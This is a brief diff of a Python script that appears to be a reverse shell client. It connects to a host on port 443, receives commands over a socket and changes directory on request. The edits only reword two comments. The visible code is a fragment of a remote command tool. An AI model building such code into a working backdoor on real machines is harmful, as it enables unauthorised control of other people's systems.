@@ -12,7 +12,7 @@ Host = socket.gethostbyname("localhost")  #Gets the IPV4 Address of the Device
 
 #get IP Address of Current Machine
 Port = 443
-Size = 1024 * 128 # 128KB max size of messages, feel free to increase
+Size = 1024 * 128 # 128KB max size of message
 
 emp_mess = "There is nothing in this directory or this command doesn't return a value"
 
@@ -30,7 +30,7 @@ while True:
     command = s.recv(Size).decode()     
 
     if  command.startswith("cd "):
-        os.chdir(str(command[3:]))  #Force change dir with built in OS function 
+        os.chdir(str(command[3:]))  #Force change directory with built in OS function 
         s.send(os.getcwd().encode()) 
 
     if 'exit' in command:
